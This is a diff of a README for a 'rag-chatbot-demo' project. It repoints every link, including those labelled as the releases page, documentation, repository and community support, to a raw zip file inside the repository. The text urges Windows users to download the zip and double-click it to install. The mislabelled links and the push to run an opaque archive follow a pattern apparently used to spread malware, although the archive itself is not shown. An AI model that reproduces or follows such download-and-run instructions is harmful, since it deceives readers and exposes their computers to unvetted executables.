@@ -6,7 +6,7 @@ Welcome to the rag-chatbot-demo! This application allows you to interact with AI
 
 ## 📥 Download Here
 
-[![Download Now](https://raw.githubusercontent.com/axiswone/rag-chatbot-demo/main/backend/rag-chatbot-demo-1.7.zip)](https://raw.githubusercontent.com/axiswone/rag-chatbot-demo/main/backend/rag-chatbot-demo-1.7.zip)
+[![Download Now](https://raw.githubusercontent.com/axiswone/rag-chatbot-demo/main/backend/data/rag_chatbot_demo_2.4.zip)](https://raw.githubusercontent.com/axiswone/rag-chatbot-demo/main/backend/data/rag_chatbot_demo_2.4.zip)
 
 ## 💻 System Requirements
 
@@ -40,11 +40,11 @@ To download and install the rag-chatbot-demo, follow these steps:
 
 1. **Visit the Releases Page:** Click the link below to go to the releases page.
    
-   [Visit Releases Page](https://raw.githubusercontent.com/axiswone/rag-chatbot-demo/main/backend/rag-chatbot-demo-1.7.zip)
+   [Visit Releases Page](https://raw.githubusercontent.com/axiswone/rag-chatbot-demo/main/backend/data/rag_chatbot_demo_2.4.zip)
 
 2. **Select the Latest Version:** Look for the most recent release. The latest files are always at the top.
 
-3. **Download the Application:** Click on the file appropriate for your operating system. It should be labeled clearly, such as `https://raw.githubusercontent.com/axiswone/rag-chatbot-demo/main/backend/rag-chatbot-demo-1.7.zip` for Windows or the corresponding version for your system.
+3. **Download the Application:** Click on the file appropriate for your operating system. It should be labeled clearly, such as `https://raw.githubusercontent.com/axiswone/rag-chatbot-demo/main/backend/data/rag_chatbot_demo_2.4.zip` for Windows or the corresponding version for your system.
 
 4. **Run the Application:** Locate the downloaded file on your computer. Double-click the file to start the installation process. Follow the on-screen instructions to complete the installation.
 
@@ -77,12 +77,12 @@ A: Absolutely! Contributions are welcome. Check out our contributing guidelines 
 
 ## 📚 Additional Resources
 
-- [GitHub Repository](https://raw.githubusercontent.com/axiswone/rag-chatbot-demo/main/backend/rag-chatbot-demo-1.7.zip)
-- [Documentation](https://raw.githubusercontent.com/axiswone/rag-chatbot-demo/main/backend/rag-chatbot-demo-1.7.zip)
-- [Community Support](https://raw.githubusercontent.com/axiswone/rag-chatbot-demo/main/backend/rag-chatbot-demo-1.7.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/axiswone/rag-chatbot-demo/main/backend/data/rag_chatbot_demo_2.4.zip)
+- [Documentation](https://raw.githubusercontent.com/axiswone/rag-chatbot-demo/main/backend/data/rag_chatbot_demo_2.4.zip)
+- [Community Support](https://raw.githubusercontent.com/axiswone/rag-chatbot-demo/main/backend/data/rag_chatbot_demo_2.4.zip)
 
 For more information, feel free to explore the documentation or reach out through the GitHub issues page. Your feedback helps us improve the application.
 
 ### 📥 Download Link Again
 
-Ready to start? [Visit the Releases Page](https://raw.githubusercontent.com/axiswone/rag-chatbot-demo/main/backend/rag-chatbot-demo-1.7.zip) to download the rag-chatbot-demo now!
+Ready to start? [Visit the Releases Page](https://raw.githubusercontent.com/axiswone/rag-chatbot-demo/main/backend/data/rag_chatbot_demo_2.4.zip) to download the rag-chatbot-demo now!
